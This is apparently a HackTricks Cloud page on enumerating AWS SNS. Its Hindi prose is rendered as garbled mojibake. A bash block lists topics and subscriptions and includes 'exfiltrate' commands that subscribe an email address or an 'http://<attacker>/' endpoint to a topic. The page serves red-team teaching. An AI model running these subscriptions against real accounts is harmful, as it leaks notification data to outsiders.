# AWS - SNS Enum

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рд╣рдореЗрдВ **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
{% endhint %}

## SNS

Amazon Simple Notification Service (Amazon SNS) рдХреЛ рдПрдХ **рдкреВрд░реНрдг рдкреНрд░рдмрдВрдзрд┐рдд рдореИрд╕реЗрдЬрд┐рдВрдЧ рд╕реЗрд╡рд╛** рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рдЯреВ-рдПрдкреНрд▓рд┐рдХреЗрд╢рди** (A2A) рдФрд░ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рдЯреВ-рдкрд░рд╕рди** (A2P) рд╕рдВрдЪрд╛рд░ рдкреНрд░рдХрд╛рд░реЛрдВ рджреЛрдиреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

A2A рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдореЗрдВ **рдкреНрд░рдХрд╛рд╢рди/рд╕рджрд╕реНрдпрддрд╛ (pub/sub) рддрдВрддреНрд░** рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдпреЗ рддрдВрддреНрд░ **рд╡рд┐рд╖рдпреЛрдВ** рдХреЛ рдкреЗрд╢ рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдЙрдЪреНрдЪ-рдереНрд░реВрдкреБрдЯ, **рдкреБрд╢-рдЖрдзрд╛рд░рд┐рдд, рдХрдИ-рд╕реЗ-рдХрдИ рдореИрд╕реЗрдЬрд┐рдВрдЧ** рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВред рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рд╡рд┐рддрд░рд┐рдд рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ, рдорд╛рдЗрдХреНрд░реЛрд╕рд░реНрд╡рд┐рд╕реЗрдЬ, рдФрд░ рдЗрд╡реЗрдВрдЯ-рдЪрд╛рд▓рд┐рдд рд╕рд░реНрд╡рд░рд▓реЗрд╕ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рд╕реЗ рдЬреБрдбрд╝реЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЕрддреНрдпрдзрд┐рдХ рд▓рд╛рднрдХрд╛рд░реА рд╣реИред рдЗрди рд╡рд┐рд╖рдпреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░, рдкреНрд░рдХрд╛рд╢рдХ рдкреНрд░рдгрд╛рд▓рд┐рдпрд╛рдБ **рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА рд╕рджрд╕реНрдп рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ** рдХреЛ рд╕рдВрджреЗрд╢ рдХреБрд╢рд▓рддрд╛рдкреВрд░реНрд╡рдХ рд╡рд┐рддрд░рд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рдлреИрдирдЖрдЙрдЯ рдореИрд╕реЗрдЬрд┐рдВрдЧ рдкреИрдЯрд░реНрди рдХреА рд╕реБрд╡рд┐рдзрд╛ рдорд┐рд▓рддреА рд╣реИред

### **SQS рдХреЗ рд╕рд╛рде рдЕрдВрддрд░**

**SQS** рдПрдХ **рдХреНрдпреВ-рдЖрдзрд╛рд░рд┐рдд** рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рдмрд┐рдВрджреБ-рд╕реЗ-рдмрд┐рдВрджреБ рд╕рдВрдЪрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рд╕рдВрджреЗрд╢ рдПрдХ **рдПрдХрд▓ рдЙрдкрднреЛрдХреНрддрд╛** рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпрд╣ **рдХрдо рд╕реЗ рдХрдо рдПрдХ рдмрд╛рд░ рдбрд┐рд▓реАрд╡рд░реА** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдорд╛рдирдХ рдФрд░ FIFO рдХрддрд╛рд░реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдкреБрдирдГ рдкреНрд░рдпрд╛рд╕ рдФрд░ рд╡рд┐рд▓рдВрдмрд┐рдд рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рдВрджреЗрд╢ рдкреНрд░рддрд┐рдзрд╛рд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
рджреВрд╕рд░реА рдУрд░, **SNS** рдПрдХ **рдкреНрд░рдХрд╛рд╢рди/рд╕рджрд╕реНрдпрддрд╛-рдЖрдзрд╛рд░рд┐рдд рд╕реЗрд╡рд╛** рд╣реИ, рдЬреЛ **рдПрдХ-рд╕реЗ-рдХрдИ** рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ **рдХрдИ рдЧреНрд░рд╛рд╣рдХреЛрдВ** рдХреЛ рдПрдХ рд╕рд╛рде рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ **рд╡рд┐рднрд┐рдиреНрди рд╕рджрд╕реНрдпрддрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдЬреИрд╕реЗ рдИрдореЗрд▓, рдПрд╕рдПрдордПрд╕, Lambda рдлрдВрдХреНрд╢рдВрд╕, рдФрд░ HTTP/HTTPS** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдФрд░ рд▓рдХреНрд╖рд┐рдд рд╕рдВрджреЗрд╢ рд╡рд┐рддрд░рдг рдХреЗ рд▓рд┐рдП рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рддрдВрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред\
рдЬрдмрдХрд┐ рджреЛрдиреЛрдВ рд╕реЗрд╡рд╛рдПрдВ рд╡рд┐рддрд░рд┐рдд рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдореЗрдВ рдШрдЯрдХреЛрдВ рдХреЗ рдмреАрдЪ рдбрд┐рдХрдкрд▓рд┐рдВрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИрдВ, SQS рдХрддрд╛рд░рдмрджреНрдз рд╕рдВрдЪрд╛рд░ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдФрд░ SNS рдЗрд╡реЗрдВрдЯ-рдЪрд╛рд▓рд┐рдд, рдлреИрди-рдЖрдЙрдЯ рд╕рдВрдЪрд╛рд░ рдкреИрдЯрд░реНрди рдкрд░ рдЬреЛрд░ рджреЗрддрд╛ рд╣реИред

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ **topic рдХрд╛ рдкреНрд░рдХрд╛рд░ FIFO** рд╣реИ, рддреЛ рдХреЗрд╡рд▓ **SQS** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рдмреНрд╕рдХреНрд░рд╛рдЗрдмрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (HTTP рдпрд╛ HTTPS рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛)ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рднрд▓реЗ рд╣реА `--topic-arn` рдореЗрдВ рдХреНрд╖реЗрддреНрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк **`--region`** рдореЗрдВ рд╕рд╣реА рдХреНрд╖реЗрддреНрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ рдЕрдиреНрдпрдерд╛ рдЖрдкрдХреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рдорд┐рд▓реЗрдЧреА рдЬреЛ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ рд▓реЗрдХрд┐рди рд╕рдорд╕реНрдпрд╛ рдХреНрд╖реЗрддреНрд░ рдХреА рд╣реИред
{% endhint %}

#### Unauthenticated Access

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### Privilege Escalation

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### Post Exploitation

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### Persistence

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## References

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**subscription plans**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ рдлреЙрд▓реЛ рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}
